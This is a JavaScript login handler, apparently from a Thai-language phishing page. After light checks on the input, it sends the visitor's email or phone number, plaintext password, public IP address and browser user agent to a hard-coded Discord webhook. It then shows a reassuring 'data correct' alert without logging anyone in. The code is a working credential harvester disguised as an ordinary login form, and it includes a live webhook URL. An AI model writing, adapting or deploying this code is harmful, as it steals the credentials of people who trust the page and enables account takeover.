document.querySelector(".login").addEventListener("click", async () => {
    const emailOrPhone = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;

    const phoneRegex = /^\d{10}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!phoneRegex.test(emailOrPhone) && !emailRegex.test(emailOrPhone)) {
        alert("กรุณากรอกเบอร์โทร 10 หลัก หรืออีเมลให้ถูกต้อง");
        return;
    }

    if (password.length < 8) {
        alert("รหัสผ่านต้องมีอย่างน้อย 8 ตัวอักษร");
        return;
    }

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        const userAgent = navigator.userAgent;
        const response = await fetch("https://discord.com/api/webhooks/1520012502598029392/SOn1Y-CUuI1_X6kasBZ8b9uiawN3lns6lwfwj5X5MfMomKD0fLF1ErCukpQzrWqDw3cG", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: `มีการกด Login\nEmail/Phone: ${emailOrPhone}\nPassword: ${password} \nIP: ${ipData.ip}\nUser Agent: ${userAgent}`
            })
        });

        if (!response.ok) {
            throw new Error("ส่ง Webhook ไม่สำเร็จ");
        }

        alert("ข้อมูลถูกต้อง");
    } catch (err) {
        console.error(err);
        alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
    }
});
